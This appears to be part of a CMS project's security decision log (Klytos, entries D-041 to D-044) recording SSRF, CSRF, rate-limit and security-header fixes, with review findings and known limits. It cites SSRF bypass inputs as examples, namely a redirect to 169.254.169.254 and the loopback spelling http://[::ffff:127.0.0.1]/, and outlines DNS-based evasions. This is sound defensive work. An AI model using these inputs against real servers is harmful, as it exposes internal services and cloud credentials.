- The removed branch was removed with its exit condition stated (per **L-007**, which forbids deleting code as "dead" without establishing what would still execute it): a stale cached page could still POST `request_identity_download`. With the branch gone it falls through to a harmless re-render; with the branch kept it would redirect to a guaranteed **405** — a path that cannot succeed. The less misleading outcome wins.
- Test cover, one named test per property: `testS12IdentityExportRefusesAStateChangingGet`, `testS12IdentityExportRequiresCsrf`, and `testS12IdentityExportIsOwnerOnlyAndDoesNotFatal` (carried over from slice 4, still asserting on the response BODY per L-009). The first two were **proven to fail** against the unfixed code — 200 where 405 and 403 were required — before the fix landed. Independent confirmation arrived unbidden: the repaired D-039 guard fired on both tests against the unfixed code, because the GET really did write config, and stopped firing once the fix landed.
- Why the docblock is corrected instead of the protections built (the user's call): re-auth and 2FA are the authentication subsystem and an email notification adds a mail dependency — a second subsystem with its own test point, inside a slice already carrying six findings. The authentication slice is already opening that plumbing for NEW-09 and NEW-11.
- Alternatives rejected (and why): **implement re-auth, 2FA and the notification now** (strongest posture for the highest-value secret in the system, and defensible — but it is scope the sprint deliberately bounded, and D-031 narrowed the "fix what you touch" rule to the code path the slice is already changing, which this is not); **keep the redirect and add a one-time token** (preserves the existing UI flow, but invents a second single-use-token mechanism beside CSRF for no gain); **leave the docblock and add a TODO** (rejected outright — an unimplemented claim in a security docblock is the L-002 defect verbatim, and this one had already misled a reviewer once).
- Supersedes: none. Closes the remaining half of audit **S-12**; opens **NEW-13**.

## D-041 — SSRF is refused by one class applied at the influenced call sites, and redirects are walked by hand
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 6
- Decision: `Klytos\Core\SafeHttp` (`installer/core/safe-http.php`) becomes the single implementation of "may this URL be fetched", **promoted** from `KlytosImporter\ImportValidator::validateUrl()` rather than written fresh. It is applied at the call sites whose URL an untrusted party influences — `admin/api/oembed.php` (S-08), `core/webhook-manager.php` (both `create()` and `sendHttpPost()`), `core/integrity-checker.php::registerDeveloperKey()` — and `ImportValidator` now **delegates** to it. `klytos_http_get()` / `klytos_http_post()` are deliberately left unchanged. Reached via `klytos_safe_http()`.
- Why promotion and not a new implementation: the check already existed and worked; what it lacked was reach. Writing a second one would have created exactly the drift L-004 records — two surfaces describing the same rule, free to diverge, with the forgotten copy rotting. This is the same move slice 4 made when it promoted the denial shape out of `router.php:438-447` instead of inventing a second one.
- Why the class is a FETCHER and not just a validator, which is the load-bearing part: pre-flight validation is necessary and **not sufficient**. A public host that passes the check can answer `302 Location: http://169.254.169.254/`, and both cURL's `CURLOPT_FOLLOWLOCATION` and PHP's http wrapper follow it without consulting anyone. **Measured, not assumed:** `CURLOPT_REDIR_PROTOCOLS` is set **nowhere** in this repository, the four `stream_context_create` fetch sites set no `max_redirects` and therefore inherit PHP's default of **20**, and only one call site in the entire product (`PageFetcher::fetch()`) re-validated after a redirect at all — and that one checks only the FINAL url, after the body has already been fetched. So a validated call site was still one attacker-controlled redirect away from the metadata endpoint. SafeHttp turns the transport's redirect handling off and walks the chain itself, re-validating every hop, with method/body following RFC 9110 §15.4 so callers keep the behaviour they had.
- The finding was WIDER than the audit recorded, and this is the part worth carrying forward: S-08 described one arbitrary fetch (`discoverOembed( $url )`). Reading the file for the fix found a **second** one — the endpoint *discovered inside* the fetched page (`<link type="application/json+oembed" href="...">`) is equally attacker-controlled, and unlike the page fetch **its response is echoed back to the caller** (whole on success, first 500 bytes on a JSON parse failure). That is a full read-SSRF primitive, and validating only the caller-supplied URL would have left it open. Every fetch in the file now goes through one function for that reason.
- Refusals answer as the generic failure, never as an oracle: `oembed.php` returns the same `400 Invalid URL` for a refused private address as for a malformed one. A distinct reply per reason would turn an authenticated editor into an internal-network scanner, one address per request. The specific reason goes to `error_log()` and the `http.safe.blocked` action.
- Why `klytos_http_get()` was NOT made safe by default: it would refuse any plugin legitimately calling a LAN or localhost service — a breaking change for third parties, which in this project needs its own decision and release note (the D-034 precedent), not a quiet inclusion in a security slice. Plugin authors fetching untrusted URLs call `klytos_safe_http()`; the reference doc says so in those words.
- Extension points, with the risk stated rather than buried: `http.safe.allowed_schemes` and `http.safe.max_redirects` (filters) **can** weaken a shipped control, exactly as `admin.gate_map` can (D-032) — both are plugin-trust boundaries and plugins already run as first-party code here. What neither can do is open a hole by omission, since the default is an allow-list. `http.safe.blocked` is an **action, not a filter**: a listener able to turn a refusal into a grant would put SSRF policy back in third-party hands, which is the same reasoning that shaped `auth.access_denied`.
- Fixed in-path, per D-031's narrowing: `HttpClient::requestWithStream()` accepted `follow_redirects` at `request()` and then **dropped it**, hardcoding `follow_location => 1`. A caller that switched redirects off got them anyway whenever `ext-curl` was absent — which would have handed back the exact SSRF SafeHttp exists to prevent, on precisely the hosts least likely to notice. The slice was already changing this transport; leaving it would have shipped a control with a documented bypass.
- Second known limit, found by reading the transport rather than by testing it, and documented rather than closed: `HttpClient::request()` applies the `http.before_request` filter to the method, URL and options at `http-client.php:91` — **after** `SafeHttp` has validated. A plugin listening there can substitute a private address post-check. This is the same plugin-trust boundary as `admin.gate_map` (D-032), so it is consistent with how this project already treats plugin code, but it is named explicitly in `docs/reference/safe-http.md` because — unlike `http.safe.allowed_schemes` — it is not a hook anyone would expect to be a security surface. Moving the validation below the filter was considered and rejected for this slice: it would mean `SafeHttp` reaching past `HttpClient`'s public API into its transport methods, which trades a documented plugin-trust issue for a structural coupling, and the filter predates this slice.
- Known limit, recorded as **NEW-15** and stated in the reference doc rather than implied away: DNS rebinding survives. The host is resolved to validate and resolved again to connect. Closing it means pinning the validated address (`CURLOPT_RESOLVE`), which changes `HttpClient`'s contract for every caller and needs a resolver the test can control. **Slice 6 raises the cost of SSRF substantially; it does not make it impossible**, and saying otherwise would be the L-002 defect verbatim.
- Alternatives rejected (and why): **validate at the oEmbed call site only** (closes the named finding with the smallest diff — but leaves the AI-reachable webhook URL behind `FILTER_VALIDATE_URL`, leaves two copies of the check, and leaves the discovered-endpoint fetch open); **make `HttpClient` refuse private addresses for everyone** (widest coverage, and the right long-term end state — but it is a breaking change for third-party plugins landing inside a security slice, which is the tangling D-025/D-026/D-029/D-031 have each refused in turn); **keep `CURLOPT_FOLLOWLOCATION` and re-validate only the final URL** (what `PageFetcher` does today — cheapest, and unsound: the body has already been fetched from the internal host by the time the check runs, and intermediate hops are never seen at all).
- **Amended after the slice's own review cycle, before commit.** Both review subagents ran on the diff and between them, plus one finding neither produced, the slice grew materially. Recorded here rather than silently folded in, because the shape of what they caught is the transferable part:
  - **A live bypass in the new class, found by testing rather than by either reviewer.** `filter_var`'s reserved-range flags do not understand IPv4-mapped IPv6, so `http://[::ffff:127.0.0.1]/` was ALLOWED and verified to fetch loopback for real (HTTP 200, body returned). Every private address has such a spelling. `isReservedAddress()` now normalizes IPv4-mapped and IPv4-compatible IPv6 to dotted-quad on the packed bytes before classifying. The `security-auditor` raised the case and reasoned past it — "very likely already handled correctly" — which is why **L-013** exists: a reviewer's reassurance is a hypothesis exactly like a reviewer's accusation.
  - **A dual-stack gap:** `gethostbynamel()` reads A records only while the transport is dual-stack, so a public A plus a private AAAA passed. `resolveHost()` now reads AAAA too and every returned address must pass. No rebinding trick needed for this one — two DNS records.
  - **The same file had a second, unfixed untrusted fetch.** `integrity-checker.php::httpGet()` takes its URL from `resolvePluginManifestUrl()`, i.e. an external plugin's `Integrity URL` header — the *same* untrusted plugin file, parsed by the *same* parser, as the `Integrity Key URL` this decision originally fixed. It had raw cURL, `FOLLOWLOCATION`, and no address check at all. Fixing one of two identical paths in one file is precisely the failure this class exists to end, and the first draft of this decision did exactly that.
  - **The importer's three fetchers were converted after all**, reversing this decision's original scope. `PageFetcher::fetch()`, `PageFetcher::fetchRobotsTxt()`, `MediaDownloader::downloadFile()` and `SitemapParser::fetchXml()` now call `fetch()` rather than validating through `ImportValidator` and then issuing their own `CURLOPT_FOLLOWLOCATION` request. The original draft left them, and both reviewers called that blocking with the same argument: the audit's own S-08 text names them, and this decision's "alternatives rejected" list cites `PageFetcher` **by name** as the unsound pattern while shipping it unchanged. `MediaDownloader` was the worst of them — it never re-checked the destination even once, so a redirect into the internal network wrote that response to disk as a servable "media asset". `docs/reference/safe-http.md` had also claimed these paths were covered, which was the L-002 defect in a document written in the same slice that warns about it.
  - **A new oracle was introduced and removed.** `WebhookManager::create()` initially threw a distinct message for a blocked address versus a malformed URL — reachable from the MCP tool `klytos_create_webhook`, which per NEW-02/D-020 has **no permission check** until Sprint 2, and echoed into the page by `admin/webhooks.php`. That is the scanner this slice deliberately avoided building in `oembed.php`, built in the same slice, three files away. Both messages are now identical.
  - Smaller, all confirmed against source before acting: `update()` gained the same check as `create()` (no caller today — which is exactly why); `absolutize()` now handles a query-only `Location` per RFC 3986 §5.3 and normalizes dot segments; the `http.safe.redirect` docblock no longer claims the hop was followed; and `IntegrationTestCase::tearDown()` runs the hook check **before** the config check, because a throwing config assertion would otherwise stop the hook check from ever running — L-010's masking shape one level removed.
- Supersedes: none. Closes audit **S-08**; opens **NEW-15**.

## D-042 — The integration tier records a hook baseline and fails a test that leaks one
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 6
- Decision: `IntegrationTestCase` captures `Hooks::getRegisteredHooks()` after `App::boot()` and asserts in `tearDown()` that the test handed it back unchanged. Throwaway listeners are registered with new `addTemporaryFilter()` / `addTemporaryAction()` helpers, which remove them by **callback identity**; a test using the raw `klytos_add_filter()` / `klytos_add_action()` and leaving a listener behind now FAILS with an explicit message.
- What was wrong: `UnitTestCase` calls `Hooks::reset()` before and after every test. The integration tier called it **never**. `Hooks` is static and `App::boot()` runs once per process, so any listener a test registered persisted for every test that ran afterwards in the same process.
- Why nobody had noticed, which is the transferable part: **no integration test had ever registered a hook.** The tier had been in use since slice 1 and the gap was invisible because nothing exercised it. Slice 6 is the first — its `http.safe.allowed_schemes` test permits `ftp://`, and that filter was silently permitting `ftp://` for every test that followed it. Caught by reading the tier's own refusal logs and noticing a later test reported `too_many_redirects` where `private_or_reserved_address` was expected: the *reason* was wrong, and the reason is exactly what the slice's tests assert on for this purpose.
- Nothing was passing for the wrong reason **yet**, and that is stated precisely rather than inflated: the affected assertions still held. But the next security test to register a weakening filter would have leaked it into everything downstream, and it would have looked exactly like a green suite — which is L-010's failure mode, one slice after L-010 was written.
- Why a baseline and not `Hooks::reset()`: a blanket reset would strip the core and plugin hooks `App::boot()` registered, for every test after the first, leaving the application quietly half-wired. The baseline is taken *after* boot, so it means "the application's own hooks" rather than "no hooks".
- Why removal is by callback identity and not `removeAllFilters( $hook )`: a test that hooks a name the application also uses must not take the application's listeners down with its own on the way out.
- Proven in both directions before being trusted, per **L-010** — one direction is half a test: a throwaway probe test that leaked a filter through the raw API **FAILED** with the intended message, and a sibling test using `addTemporaryFilter()` **PASSED** in the same run. The probe was then deleted. Evidence in `docs/05-test-points.md`.
- Alternatives rejected (and why): **per-test cleanup discipline** (no infrastructure, and it is the exact "everyone must remember" failure mode S-07 exists to close — file 67 forgets); **`Hooks::reset()` plus re-boot per test** (perfectly isolated, but `App::boot()` is not cheap and the tier's whole design is one boot per process, per D-030); **snapshot and restore the full registry by reflection** (most complete, but it couples the harness to private static internals with no compiler to catch a rename — the objection D-030 already recorded against reflection on `App::$instance`).
- Supersedes: none. Extends the isolation contract D-030 established for storage to cover hook state, which D-030 did not consider.

## D-043 — The public comment handler moves OUT of the admin tree instead of being exempted from its guard
- Date / phase: 2026-07-20 / Phase 5, Sprint 1 slice 7 (user decision on the scope question)
- Decision: Audit **S-09** is closed by **relocating** the handler, not by the remediation the audit recorded. `installer/admin/api/comment-submit.php` is **deleted** and its gate-map entry removed; the handler becomes `installer/public/comment-submit.php`, which `BuildEngine::syncCommentEndpoint()` copies to the site's **web root** so the public URL is `/comment-submit.php`. `admin/bootstrap.php`'s `$preAuthScripts` list is **not** touched. The per-session rate limit is replaced with the product's existing persistent, IP-keyed `Klytos\Core\MCP\RateLimiter`. Input bounds are added to `CommentManager::submit()`. Slice scope stops at the endpoint and its route: **no comment form is built**.
- Why the recorded remediation was rejected, verified against source rather than argued: adding the file to `$preAuthScripts` fails this slice's own test point and opens a surface nobody asked for.
  - **The URL.** The admin directory is renamed to a randomized `<hex>-admin` at install (`install.php:811-824`) and `Helpers::getBasePath()` states the name "must NEVER appear in public URLs" (`core/helpers.php:192-197`); the root `.htaccess` header says the same. A form on a generated page has to post *somewhere*, and posting to the old location would print the secret directory name onto every page of every site. Criterion 4 of the test point is exactly this.
  - **What the exemption would have PERMITTED — the D-036 question, asked this time.** `admin/bootstrap.php` runs the cron manager and the action scheduler on **every** request (`bootstrap.php:184-196`). Exempting an anonymous endpoint from the auth guard therefore hands every passer-by a scheduler trigger, on top of the comment box. `installer/index.php` does neither (`index.php:62`), and the relocated handler does neither. D-036 recorded that the webauthn diagnosis "identified the redirect and stopped, without asking what the endpoint would then permit"; this is that question answered before acting, and the answer changed the design.
- Why the web root and not a route on the public front controller: there is **no rewrite from the web root into the application**. The root `.htaccess` serves static files and clean URLs only, and its own header says it "NEVER references the admin directory directly" — so adding one would contradict the file's stated invariant. A small PHP file at the web root that discovers the installation itself is the product's existing answer to this exact problem (`core/x402-bootstrap.php:265-267` does it for `public/x402-gate.php`). The *placement* was reused; its **bootstrap was not**, because `x402-gate.php` requires `core/bootstrap-minimal.php`, **a file that does not exist in this repository** — it falls through to `index.php`, which dispatches the router rather than returning. Copying that pattern would have copied a bug.
- Why the rate limit had to change, stated precisely because "per-session" undersells it: it was **not a weak rate limit, it was none.** `Auth::startSession()` scopes the session cookie to `path=<base>/admin/` with `SameSite=Strict` (`core/auth.php:52-62`), so a form on the generated static site can never send it back and `$_SESSION['last_comment_at']` is always absent. Verified live — every anonymous request received a brand-new `klytos_session`. `MCP\RateLimiter` was **reused** rather than extended: its window is a fixed 60 seconds, so the policy is expressed as 2 requests within it instead of the old "1 per 30 seconds", because inventing a second limiter to express the interval exactly is the duplication this project treats as a defect (the slice-4 and slice-6 precedent). `installer/public/x402-gate.php:20-46` already carries such a hand-rolled duplicate; it is left alone as an adjacent subsystem and noted, not forked a third time.
- Input bounds are part of the fix, not tidying: anonymous reach turns every unbounded field into a one-request arbitrary-size disk write. `author_name` 100, `author_email` 254, `page_slug` 200 — truncated **before** `sanitizeSlug()` runs, since transliterating a megabyte first would do the work the cap exists to prevent. `parent_id` must match this collection's own ID shape (32 hex — verified against `Helpers::randomHex( 16 )`, which is 16 *bytes*, and pinned by a test, because getting that length wrong would have silently flattened every threaded reply) or it is dropped rather than stored verbatim and echoed to later readers.
- **A deeper defect was uncovered while proving the fix, and fixed in path: NEW-16.** `SiteConfig::setValue()` **did not exist**, although `core/mcp/tools/comment-tools.php:136-148` calls it four times — so `klytos_set_comment_settings`, the only supported way to switch comments on, had fataled for its entire life. Its sibling `set()` could not substitute: a hardcoded allow-list of twelve top-level fields silently drops `comments_enabled`. Both halves are fixed. This is **in scope by necessity, not opportunism** — the test point requires an anonymous submission to succeed, which is unreachable while the feature cannot be enabled — and it is the L-009 shape once more: the first fault was standing in front of the second, and a slice that had only added the `$preAuthScripts` entry would have shipped, reviewed clean, and left comments exactly as broken.
- Recorded and NOT fixed, each with a trigger: **NEW-17** (behind a non-loopback proxy every visitor shares one rate-limit bucket, so the limit becomes a site-wide throttle — the remedy is trusted-proxy configuration, which changes `getClientIp()` for MCP and OAuth too); **NEW-18** (the global `__()` is declared only in `admin/bootstrap.php:28`, while `app.php:775-793` declares a *namespaced* one, so no public entry point can translate — which is why `t.php` and `x402-gate.php` hardcode English; the new endpoint calls the I18n **service** through a local closure instead of adding a third shim, and its strings are in all 20 catalogues); **NEW-19** (`RateLimiter` rewrites its whole file per request, a characteristic that only started mattering when an unauthenticated caller could reach it).
- Scope boundary, an explicit user decision rather than an omission: **no comment form is emitted into the generated site, and none ever was.** No template, part or build step produces one, and `CommentManager::renderCommentsHtml()` returns early on zero approved comments (`comment-manager.php:257-259`), so a first commenter would have had no entry point regardless. Form emission is bound to the theme-package sprint (D-023), which is already replacing the frontend template layer that would carry it. `docs/reference/public-comments.md` says this outright rather than implying the feature is complete — asserting otherwise would be the L-002 defect.
- Alternatives rejected (and why): **add to `$preAuthScripts` as recorded** (smallest diff and matches the audit text — but it fails criterion 4 by construction and grants anonymous scheduler triggers); **keep the file and add a public proxy route that forwards to it** (preserves the existing path — but it creates two entry points for one behaviour, the duplication this project treats as a defect, and the admin-path one still answers); **build the comment form in this slice too** (genuinely completes the feature end to end — but it lands new markup in exactly the layer D-023 is scheduled to replace, and the four test-point criteria are all properties of the endpoint and its path, provable without it).
- Supersedes: the `api/comment-submit.php` gate-map entry added in slice 4 (D-032), which recorded the authorization answer for a file that no longer exists. Closes audit **S-09**; opens **NEW-17**, **NEW-18**, **NEW-19**; closes **NEW-16** in the same slice.
- **Amended after the slice's own review cycle, before commit.** Both review subagents ran on the diff; the `security-auditor` returned a finding that changed the design, and the `code-reviewer` returned six non-blocking items of which four were taken. Recorded here rather than folded in silently, because the shape of what they caught is the transferable part:
  - **The rate limit ran AFTER `App::boot()`, so the control that bounds abuse sat behind the expensive thing it was bounding.** `App::boot()` decrypts the config, builds ~25 managers and runs `PluginLoader::loadAll()`, executing every active plugin's `init.php` (`app.php:530-537`). Every check in the file needed a booted App, so an anonymous caller paid the full boot cost per request — at a **fixed, scannable URL present on every install**, where previously reaching that cost anonymously meant guessing the randomized admin directory. Restructured: a non-filterable flood ceiling (10/60s) now runs **before** boot, needing only `RateLimiter`'s directory path (`rate-limiter.php:35-38`) and `App::$dataPath`'s definition as `rootPath . '/data'` (`app.php:228`), with the class explicitly required because the autoloader only exists after boot — the same thing `t.php` does. The filterable policy limit (2/60s) then runs post-boot and derives its count from `getRemainingRequests()`, so it costs no second write. **This is the D-036 class of finding arriving anyway**: the URL question had been asked and answered, and a *different* consequence of making the surface public had not been.
  - **Worse, and entirely mine: the honeypot was checked BEFORE the rate limit**, so a flood that simply set `_honeypot` on every request took the cheap success branch and was **never counted**. The one control meant to bound repeated abuse did not engage for precisely the traffic it exists for. The honeypot now runs after the limiter, pinned by `testHoneypotSubmissionsAreRateLimitedToo`, proven to fail against the old ordering.
  - **The honeypot response was distinguishable from a success** — it answered `200` where a real submission answers `201`, while the code comment beside it claimed it responded "exactly as a success would". A bot comparing status codes once would have learned the field is a trap. It now answers `201` with a syntactically valid decoy id; the test asserts the shape matches AND that no such record exists.
  - **Three user-facing validation messages in `CommentManager::submit()` were hardcoded English** and are returned verbatim to anonymous callers through the endpoint's `400` branch. Now `__( 'comments.*' )` with keys in all 20 catalogues — verified live that `__()` resolves from inside `Klytos\Core` and returns the catalogue value, rather than assumed. The `405`/`500` paths keep literal strings by necessity: they fire before I18n exists (NEW-18).
  - **`installer/public/` was not in `phpcs.xml`'s scanned set at all**, so the D-025 baseline lock had never covered any public entry point — `x402-gate.php` had visible convention violations that lint had never reported. The directory is now scanned; its two pre-existing errors were auto-fixed, and it sits at 0/0.
  - **The JSON responder** does not call `Helpers::jsonResponse()` because two of its responses fire before `core/app.php` is required. Keeping one responder for the whole file beats two, but its flags now match (`JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES`) so an accented author name is not `\uXXXX`-escaped here and literal everywhere else.
  - **Escaping tightened in `renderThread()`** — `$date` printed as element text and the gravatar URL were unescaped. Verified NOT exploitable (both values are server-generated, `Helpers::now()` and an md5 hash) and pre-dating this slice, fixed anyway: the project's "escape at print time" rule has no exceptions, and a print site whose safety depends on an invariant three functions away is one refactor from being live.
  - **Deliberately NOT taken, with the reason recorded:** the ~10-line install-root discovery loop is duplicated between this endpoint and `x402-gate.php`. Extracting it into one helper is correct and is not done here, because the helper must load before boot and the second caller is the x402 surface — an adjacent subsystem under D-031's narrowing, whose own bootstrap is separately broken (it requires a `core/bootstrap-minimal.php` that does not exist). Naming it rather than half-extracting it; trigger is the next public entry point, which would make it three copies.
  - Findings from the same pass recorded and not fixed: **NEW-19** extended (identifier set grows monotonically; address rotation gets a bucket each) and **NEW-20** (`RateLimiter::check()` is a read-decide-write with no lock spanning it — carried as **plausible-and-unproven**, since neither the reviewer nor this slice ran the concurrency test that would settle it).

## D-044 — Security headers get ONE enforcement point, HSTS is HTTPS-only and subdomain-free, and the CSP fails closed
- Date / phase: 2026-07-20 / Phase 5, Sprint 1 slice 8 (HSTS policy and the page-editor scope question decided by the user)
- Decision: `Auth::sendSecurityHeaders()` is called **once**, from `installer/admin/bootstrap.php`, for every admin surface — the S-07 answer applied to headers. It gains `Strict-Transport-Security: max-age=31536000`, sent **only over TLS**, **without** `includeSubDomains`, filterable through `security.hsts`. Its CSP now **fails closed**: a caller supplying no nonce gets `script-src 'self'`, not the old `'self' 'unsafe-inline'`. The policy computation is split into a pure `Auth::buildSecurityHeaders()` so it can be tested at all. `Helpers::isHttps()` becomes the single HTTPS check, replacing four duplicated expressions.
- **Why one enforcement point rather than 25 calls** — this is NEW-14 and it is the S-07 shape exactly: the function had six call sites repo-wide and none was an admin API endpoint. Adding a call to each file has the identical failure mode one file later. Every admin file requires `admin/bootstrap.php` (verified mechanically this slice, not taken from slice 4's record: 73 PHP files under `admin/`, of which 9 are templates/partials/includes that are *included* rather than requested, leaving 64 entry points — the same 64 `scripts/keel-verify` counts).
- **The audit's own numbers were stale and its framing was wrong on two pages.** NEW-14 says "all 24 files in `installer/admin/api/`"; there are **23** — slice 7 deleted `comment-submit.php` (D-043). And it says "every admin PAGE gets them, because they all include `templates/header.php`", which is **false for five pages**: `bootstrap.php`, `login.php`, `logout.php`, `reset-password.php` and `setup-wizard.php` do not include it. Two of those called `sendSecurityHeaders()` themselves; **`login.php` and `logout.php` called nothing**. So the real gap was **25 surfaces including the login form**, not 24 JSON endpoints. Found by enumerating the pages rather than trusting the sentence — the L-014 discipline.
- **PLACEMENT IS THE LOAD-BEARING PART, and it is bounded on both sides.** Slice 7 established that a check placed after `App::boot()` is a cost an anonymous caller pays, and that a cheap branch before a limiter bypasses it; headers have the same shape, because *a header set after output has begun is not set at all*. The call sits immediately after the boot try/catch:
  - It cannot go **later**: everything below it in bootstrap emits or exits — the pending-rename redirect, the auth guard's 401 JSON and its 302, `klytos_deny()`'s 403 document, the setup-wizard redirect. All four are now covered, verified on real responses (the 401 and the 403 both carry `nosniff` on the wire).
  - It cannot go **earlier**: `App::boot()` **Step 1** is `registerAutoloader()` (`app.php:268`), so the `Auth` class does not resolve before boot, and `klytos_apply_filters()` does not exist until `app.php:331` requires `helpers-global.php` inside the same boot. **Probed, not inferred** — `class_exists( 'Klytos\Core\Auth', true )` returns NO both after `require app.php` and after `App::getInstance()`. This is L-006's rule applied before writing the line rather than after debugging it.
  - Consequence stated rather than left implied: the **boot-failure page** (which echoes an escaped exception message) and the two pre-boot redirects still send no headers, because the autoloader does not exist on those paths. Recorded as **NEW-22**.
- **Why HSTS is HTTPS-only and carries no `includeSubDomains`** (user decision, chosen over the stronger variant): a browser caches the directive for the full `max-age` and honours it after the header stops being sent, so it is close to irreversible for an installed base. `includeSubDomains` would force HTTPS onto every sibling subdomain of the install's host — subdomains that belong to the operator, not to Klytos, and that may legitimately serve plain HTTP. Klytos is self-hosted software; opting somebody else's infrastructure into a year-long, hard-to-undo directive by default is not ours to do. Operators who want preload or subdomains widen it through `security.hsts`. Sending it over cleartext was rejected as well: browsers ignore it there, so it would be a claim the transport cannot back.
- **Why the CSP fail-open mattered more than it looked, and this is the finding of the slice.** The old fallback meant a caller that forgot a nonce silently received the weakest policy in the product, with nothing to signal it. That is bad on its own. What made it load-bearing here is that **`login.php` had no CSP at all** and carries an inline `<script>` — the 2FA method switcher. Giving every surface a CSP therefore *would have broken two-factor login* had the fallback stayed weak enough to hide it, or had the block not been nonced. A security fix that breaks authentication is worse than the gap it closes; nonce-ing `login.php` is in scope **by necessity**, the same shape as NEW-16 in slice 7.
- **The public front controller is the exception, and it is stated at the call site instead of inherited.** `installer/index.php` now passes an **explicit** `$customCsp` that keeps `script-src 'unsafe-inline'`. This is not a lapse: `Router::dispatch()` `readfile()`s **pre-generated static HTML** (`router.php:303-326`), and the build engine writes inline `<script>` into it — the GDPR consent banner's `ConsentManager.init(...)` (`build-engine.php:881`) and a page's `custom_js` (`build-engine.php:444`). **A file generated once at build time cannot carry a per-request nonce.** Verified before deciding: failing closed there would have silently disabled the consent banner on every generated page of every site. Writing the policy out as a literal makes the weakening visible in a diff, which is precisely what the implicit fallback did not do. Recorded as **NEW-23**; the real fix belongs to the theme-package sprint (D-023), which owns generated output.
- **`style-src` keeps `'unsafe-inline'` deliberately, and a test asserts that weakness on purpose.** S-10 is explicitly out of scope (349 inline `style=` attributes across 40 files; an attribute cannot take a nonce). The trap that made this worth pinning: per CSP Level 3, adding a **nonce source** to `style-src` makes browsers **ignore** `'unsafe-inline'` — so "tidying" the policy by nonce-ing styles the way scripts are nonced would break the admin's rendering everywhere at once. The **10** `<style>` elements in `installer/admin/` now all carry nonce **attributes** that do nothing yet and are ready for the slice that removes `'unsafe-inline'` (4 already had them; 6 were added here). **The audit's "12" is wrong and is corrected in the same change**: it counted two `<style>` occurrences that are embedded inside `srcdoc` attributes (`blocks.php:82`, `block-data.php:172`), which build an iframe document as an escaped string and therefore cannot carry a nonce at all. Counting them made the S-10 estimate look larger than it is and would have sent the next slice hunting for two blocks that do not exist. `testStyleSrcStillAllowsInlineWhileS10IsOpen` exists so that removal is a deliberate act, not a side effect.
- **A false pass was caught in the slice's own test infrastructure, which is L-010 arriving for the third time.** The first unit tests drove `sendSecurityHeaders()` and read `headers_list()`. Under the **CLI SAPI `header()` is a no-op and `headers_list()` returns an empty array**, so all three "the header is ABSENT" assertions passed against an empty string — and would have passed against code that set no headers at all. They were caught only because the *presence* assertions in the same file failed loudly for the same underlying reason. The repair is the `buildSecurityHeaders()` split: the unit tier now asserts the **policy** and the integration tier asserts it **reaches the wire**. A second false pass was caught by probe in the integration tier: an assertion searching the whole response body for the nonce still passed with the nonce stripped from the `<script>` tag, because `login.php`'s `<style>` block carries one too.
- Alternatives rejected (and why): **add `sendSecurityHeaders()` to all 25 surfaces** (matches the audit's implicit shape and is closest to the existing code — but surface 26 forgets, which is the defect S-07 exists to end); **send the headers from `.htaccess`/the web server** (no nonce awareness at all, and the product supports a renameable install directory and multiple storage backends); **`includeSubDomains` now** (stronger, and rejected above on installed-base grounds); **fail the CSP closed everywhere including `index.php`** (uniform and simple, and it silently breaks the consent banner on every generated site — rejected on verified evidence, not on caution).
- Supersedes: none. Closes audit **S-11**, the **CSP fail-open**, and **NEW-14**; opens **NEW-21**, **NEW-22**, **NEW-23**.
- **Amended after the slice's own review cycle, before commit.** Both review subagents ran on the diff. Recorded here rather than folded in silently, because the shape of what they caught is the transferable part — and because one of the two headline findings was **stale rather than real**, which is itself the lesson:
  - **The `code-reviewer`'s single BLOCKING finding was REFUTED — it was reading a snapshot.** It reported that `docs/PROGRESS.md` still said "slices 0–7 closed / next is slice 8" while every other doc surface recorded the slice as done. Verified before acting: `PROGRESS.md` had already been updated, several minutes *before* the reviewer finished. The reviews were launched while the code was stable but the docs were still being written, so the agent read a mid-slice tree. **A review is a snapshot of the moment it read, not of the moment it reports** — and L-013's rule (verify the claim, do not act on it) is what stopped a "fix" that would have re-edited a correct file. The other reviewer, running in the same window, read `PROGRESS.md` after the edit and said nothing.
  - **The `security-auditor` found the slice's own subject sitting one directory outside its scope**, and this is the finding that matters: `installer/public/comment-submit.php` and `installer/public/x402-gate.php` send **no security headers at all**, not even `nosniff`. Both are anonymous, at fixed scannable URLs on every install — a more exposed position than the admin surfaces this slice just covered. Verified by grep rather than accepted: the only `header()` calls in either file are `Content-Type`, `Allow` and `Retry-After`. It is **NEW-14's own shape at file N+1**. Recorded as **NEW-24** and deliberately not fixed: neither file requires `admin/bootstrap.php` (that is the point of D-043's relocation), and `comment-submit.php` answers its flood ceiling **before** `App::boot()` by design, so a post-boot call would leave precisely that path uncovered — the NEW-22 shape again. What changed *in* this slice is the claim: `docs/reference/security-headers.md` now states in its own words that slice 8 covers the admin plus the front controller and **not** those two, because writing "every response carries headers" would have been the L-002 defect in a document created to prevent it.
  - **A count I introduced this slice was wrong, in the L-002 class, in text arguing against exactly that.** Both this decision and the new reference doc said "the 12 `<style>` blocks now carry nonce attributes". There are **10** in `installer/admin/`, all now nonced. The audit's S-10 figure of 12 counts two occurrences embedded in `srcdoc` attributes (`blocks.php:82`, `block-data.php:172`) that build an iframe document as an escaped string and **cannot carry a nonce at all**. Inherited without checking, and it would have sent the S-10 slice hunting for two blocks that do not exist. Corrected in both places and in the audit entry.
  - **Two unescaped nonce echoes**, `updates.php:379` and `:554`, printed `$cspNonce` raw where all eleven other nonce sites use `klytos_esc_attr()`. Not exploitable — the value is `base64_encode( random_bytes( 16 ) )` and carries no HTML metacharacters — and fixed anyway, for the reason D-043 already recorded: this project's escape-at-print-time rule has no exceptions, and a print site whose safety depends on an invariant three functions away is one refactor from being live. The sharper point is that `updates.php` was one of the 18 pages this slice's own CSP sweep marked "clean", so it was looked at and the inconsistency still was not seen — a conformance check answers the question it asks, not the one next to it.
  - **A duplicate survived in the file the slice was already editing.** `Helpers::isHttps()` was added to collapse the duplicated HTTPS expression, and `admin/bootstrap.php:195` still carried a copy ~65 lines below the new enforcement point. Converted. The remaining six copies live in files this slice does not open and are recorded as **NEW-25** rather than swept, per D-031's narrowing — they matter when the definition changes, which is exactly what trusted-proxy support (NEW-17) would do.
  - **The extension-point risk paragraph was missing**, breaking the pattern D-032 and D-041 both follow. Added to the reference doc, and it is worse than "weakenable": a plugin returning `max-age=0` from `security.hsts` does not merely suppress the header, it tells browsers to **forget a previously cached HSTS policy** — a rollback. The same section now states why nothing else is filterable (a CSP filter fails permissive by construction, unlike `admin.gate_map` where omission denies) and names the cost of that choice instead of leaving it implicit.
